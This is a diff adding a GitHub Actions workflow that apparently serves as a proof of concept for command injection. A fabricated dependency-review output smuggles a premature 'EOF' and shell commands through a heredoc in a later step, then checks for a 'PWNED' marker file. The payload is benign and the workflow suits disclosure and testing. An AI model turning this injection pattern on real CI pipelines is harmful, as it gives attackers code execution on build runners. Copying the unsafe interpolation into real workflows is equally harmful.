@@ -1,0 +1,78 @@
+name: Dependency Review PoC
+
+on:
+  workflow_run:
+    workflows: ["PR Workflow"]
+    types:
+      - completed
+
+permissions:
+  actions: read
+  contents: write
+  pull-requests: read
+
+jobs:
+  dependency-review:
+    if: |
+      github.event.workflow_run.event == 'pull_request' &&
+      github.event.workflow_run.conclusion == 'success'
+    runs-on: ubuntu-latest
+    steps:
+      - name: Get PR
+        id: get-pr
+        uses: actions/github-script@3a2844b7e9c422d3c10d287c895573f7108da1b3 # v9.0.0
+        with:
+          script: |
+            const wfRun = context.payload.workflow_run;
+            const pr = wfRun.pull_requests[0];
+            let number, base_sha, head_sha;
+            if (pr) {
+              number = pr.number;
+              base_sha = pr.base.sha;
+              head_sha = pr.head.sha;
+            } else {
+              const headLabel = `${wfRun.head_repository.owner.login}:${wfRun.head_branch}`;
+              const { data: prs } = await github.rest.pulls.list({
+                owner: context.repo.owner,
+                repo: context.repo.repo,
+                state: 'open',
+                head: headLabel,
+              });
+              const matched = prs[0];
+              if (!matched) throw new Error(`No open PR found for head ${headLabel}`);
+              number = matched.number;
+              base_sha = matched.base.sha;
+              head_sha = wfRun.head_sha;
+            }
+            core.setOutput('number', number);
+            core.setOutput('base_sha', base_sha);
+            core.setOutput('head_sha', head_sha);
+      - name: Download and submit dependency graph
+        id: depgraph
+        continue-on-error: true
+        uses: gradle/actions/dependency-submission@3f5f9adaf7d9fecd50b5935e54106014257a94e6 # v6.4.0
+        with:
+          dependency-graph: download-and-submit
+      - name: Simulate dependency-review comment-content output
+        id: dependency-review
+        run: |
+          {
+            echo 'comment-content<<GHAOUT'
+            echo '<h2>Scanned Files</h2>'
+            echo '<ul><li>attacker-manifest'
+            echo 'EOF'
+            echo 'id; echo HEREDOC_RCE_MARKER; touch "$GITHUB_WORKSPACE/PWNED"; exit 0'
+            echo '</li></ul>'
+            echo 'GHAOUT'
+          } >> "$GITHUB_OUTPUT"
+      - name: Save dependency review output report
+        run: |
+          cat << 'EOF' > openssf-report.html
+          ${{ steps.dependency-review.outputs.comment-content }}
+          EOF
+      - name: Verify impact
+        run: |
+          echo "--- marker check ---"
+          ls -la PWNED && echo "RCE CONFIRMED"
+          echo "--- report head ---"
+          sed -n '1,8p' openssf-report.html
